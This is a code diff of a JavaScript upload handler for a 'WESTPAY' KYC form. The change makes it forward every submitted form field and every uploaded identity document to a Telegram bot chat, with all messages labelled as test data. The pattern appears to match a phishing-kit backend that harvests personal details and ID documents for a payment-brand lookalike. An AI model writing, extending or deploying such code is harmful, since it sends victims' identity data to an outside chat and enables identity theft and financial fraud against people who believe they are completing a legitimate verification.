@@ -27,71 +27,228 @@ export default async function handler(req, res) {
 
   try {
     const form = formidable({
-      multiples: false,
+      multiples: true,
       maxFileSize: 10 * 1024 * 1024,
       keepExtensions: true,
     });
 
     const [fields, files] = await form.parse(req);
 
-    const uploaded = files.file?.[0];
+    // ========================================================
+    // Informations du formulaire
+    // ========================================================
 
-    if (!uploaded) {
+    let information = {};
+
+    try {
+      const raw = Array.isArray(fields.information)
+        ? fields.information[0]
+        : fields.information;
+
+      if (raw) {
+        information = JSON.parse(raw);
+      }
+    } catch {
+      information = {};
+    }
+
+    // ========================================================
+    // Tous les fichiers
+    // ========================================================
+
+    let uploadedFiles = files.files || [];
+
+    if (!Array.isArray(uploadedFiles)) {
+      uploadedFiles = [uploadedFiles];
+    }
+
+    uploadedFiles = uploadedFiles.filter(Boolean);
+
+    if (uploadedFiles.length === 0) {
       return res.status(400).json({
         ok: false,
-        error: "No image received",
+        error: "No test files received",
       });
     }
 
-    const filePath = uploaded.filepath;
+    // ========================================================
+    // Construire le récapitulatif Telegram
+    // ========================================================
 
-    const telegramForm = new FormData();
+    const lines = [
+      "🧪 WESTPAY — TEST KYC",
+      "",
+      "⚠️ TEST DATA ONLY",
+      "This submission is for testing purposes.",
+      "",
+      "━━━━━━━━━━━━━━━━━━━━",
+      "📋 FORM INFORMATION",
+      "━━━━━━━━━━━━━━━━━━━━",
+    ];
 
-    telegramForm.append("chat_id", chatId);
-    telegramForm.append(
-      "caption",
-      "🧪 WESTPAY TEST\n\n📎 Test image received from KYC form.\n\n⚠️ TEST FILE ONLY"
+    for (const [key, value] of Object.entries(information)) {
+      let displayValue = value;
+
+      if (Array.isArray(value)) {
+        displayValue = value.join(", ");
+      }
+
+      if (
+        displayValue === null ||
+        displayValue === undefined ||
+        displayValue === ""
+      ) {
+        displayValue = "Not provided";
+      }
+
+      const label = key
+        .replace(/_/g, " ")
+        .replace(/\b\w/g, (letter) =>
+          letter.toUpperCase()
+        );
+
+      lines.push(
+        `${label}: ${displayValue}`
+      );
+    }
+
+    lines.push("");
+    lines.push(
+      `📎 Test files: ${uploadedFiles.length}`
     );
 
-    const buffer = fs.readFileSync(filePath);
+    const telegramUrl =
+      `https://api.telegram.org/bot${token}`;
 
-    const blob = new Blob([buffer], {
-      type: uploaded.mimetype || "image/jpeg",
-    });
+    // ========================================================
+    // Envoyer le récapitulatif
+    // ========================================================
 
-    telegramForm.append(
-      "photo",
-      blob,
-      uploaded.originalFilename || "test-image.jpg"
-    );
-
-    const response = await fetch(
-      `https://api.telegram.org/bot${token}/sendPhoto`,
+    const textResponse = await fetch(
+      `${telegramUrl}/sendMessage`,
       {
         method: "POST",
-        body: telegramForm,
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: lines.join("\n"),
+        }),
       }
     );
 
-    const result = await response.json();
+    const textResult =
+      await textResponse.json();
 
-    try {
-      fs.unlinkSync(filePath);
-    } catch {}
+    if (!textResult.ok) {
+      console.error(
+        "Telegram sendMessage error:",
+        textResult
+      );
 
-    if (!result.ok) {
       return res.status(500).json({
         ok: false,
-        error: "Telegram API error",
+        error: "Unable to send form information",
       });
     }
 
+    // ========================================================
+    // Envoyer chaque fichier
+    // ========================================================
+
+    let sentFiles = 0;
+
+    for (let i = 0; i < uploadedFiles.length; i++) {
+      const uploaded = uploadedFiles[i];
+
+      if (!uploaded?.filepath) {
+        continue;
+      }
+
+      const buffer =
+        fs.readFileSync(uploaded.filepath);
+
+      const filename =
+        uploaded.originalFilename ||
+        `test-file-${i + 1}.jpg`;
+
+      const mime =
+        uploaded.mimetype ||
+        "application/octet-stream";
+
+      const telegramForm =
+        new FormData();
+
+      telegramForm.append(
+        "chat_id",
+        chatId
+      );
+
+      telegramForm.append(
+        "caption",
+        `🧪 WESTPAY TEST FILE ${i + 1}/${uploadedFiles.length}\n\n${filename}`
+      );
+
+      telegramForm.append(
+        "document",
+        new Blob(
+          [buffer],
+          { type: mime }
+        ),
+        filename
+      );
+
+      const fileResponse =
+        await fetch(
+          `${telegramUrl}/sendDocument`,
+          {
+            method: "POST",
+            body: telegramForm,
+          }
+        );
+
+      const fileResult =
+        await fileResponse.json();
+
+      if (!fileResult.ok) {
+        console.error(
+          `Telegram file ${i + 1} error:`,
+          fileResult
+        );
+      } else {
+        sentFiles++;
+      }
+
+      // Supprimer le fichier temporaire créé
+      // par formidable après traitement.
+      try {
+        fs.unlinkSync(
+          uploaded.filepath
+        );
+      } catch {}
+    }
+
+    // ========================================================
+    // Résultat
+    // ========================================================
+
     return res.status(200).json({
       ok: true,
-      message: "Test image sent to Telegram",
+      message:
+        "Test application sent to Telegram",
+      informationSent: true,
+      filesReceived:
+        uploadedFiles.length,
+      filesSent:
+        sentFiles,
     });
+
   } catch (error) {
-    console.error(error);
+    console.error(
+      "Telegram upload error:",
+      error
+    );
 
     return res.status(500).json({
       ok: false,
